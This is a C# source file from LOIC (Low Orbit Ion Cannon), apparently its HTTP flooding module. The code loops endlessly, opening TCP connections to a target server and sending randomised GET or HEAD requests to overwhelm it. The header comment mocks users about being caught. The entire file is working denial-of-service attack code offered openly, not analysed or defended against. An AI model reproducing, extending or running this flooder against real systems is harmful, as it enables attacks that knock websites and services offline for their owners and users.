/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;

namespace LOIC
{
    public class HTTPFlooder : cHLDos
    {
        private BackgroundWorker bw;
        private Timer tTimepoll;
        private bool intShowStats;

        private readonly string Host;
        private readonly string IP;
        private readonly int Port;
        private readonly string Subsite;
        private readonly bool Resp;
        private readonly bool Random;
        private readonly bool UseGet;
        private readonly bool AllowGzip;

        public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool useget, bool gzip)
        {
            this.Host = (host == "") ? ip : host;
            this.IP = ip;
            this.Port = port;
            this.Subsite = subSite;
            this.Resp = resp;
            this.Delay = delay;
            this.Timeout = timeout * 1000;
            this.Random = random;
            this.UseGet = useget;
            this.AllowGzip = gzip;
        }
        public override void Start()
        {
            this.IsFlooding = true;

            this.bw = new BackgroundWorker();
            this.bw.DoWork += bw_DoWork;
            this.bw.RunWorkerAsync();
            this.bw.WorkerSupportsCancellation = true;
        }

        public override void Stop()
        {
            this.IsFlooding = false;
            this.bw.CancelAsync();
        }

        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
                while (this.IsFlooding)
                {
                    try
                    {
                        State = ReqState.Ready; // SET STATE TO READY //
                        byte[] recvBuf = new byte[128];
                        using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                        {
                            socket.NoDelay = true;
                            State = ReqState.Connecting; // SET STATE TO CONNECTING //
                            var result = socket.BeginConnect(RHost, null, null);
                            result.AsyncWaitHandle.WaitOne(Timeout, true);
                            if (!socket.Connected)
                            {
                                socket.Close();
                                Failed++;
                                continue;
                            }
                            socket.EndConnect(result);

                            byte[] buf = Functions.RandomHttpHeader((UseGet ? "GET" : "HEAD"), Subsite, Host, Random, AllowGzip);

                            socket.Blocking = Resp;
                            State = ReqState.Requesting; // SET STATE TO REQUESTING //

                            socket.Send(buf, SocketFlags.None);
                            State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++

                            if (Resp)
                            {
                                socket.ReceiveTimeout = Timeout;
                                socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
                            }
                        }
                        Downloaded++;
                        State = ReqState.Completed;
                        if (Delay >= 0)
                            Thread.Sleep(Delay + 1);
                    }
                    catch (SocketException)
                    {
                        Failed++;
                        State = ReqState.Failed;
                    }
                }
            }
            // Analysis disable once EmptyGeneralCatchClause
            catch { Failed++; }
            finally { State = ReqState.Ready; this.IsFlooding = false; }
        }
        private static long Tick()
        {
            return DateTime.UtcNow.Ticks / 10000;
        }
    }
}